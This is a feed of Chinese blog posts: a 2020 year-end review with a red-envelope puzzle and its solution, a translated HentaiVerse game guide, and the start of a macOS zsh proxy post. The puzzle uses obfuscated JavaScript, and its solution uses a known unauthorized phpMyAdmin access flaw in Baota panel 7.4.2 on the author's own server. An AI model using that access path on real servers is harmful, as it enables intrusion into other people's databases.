进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 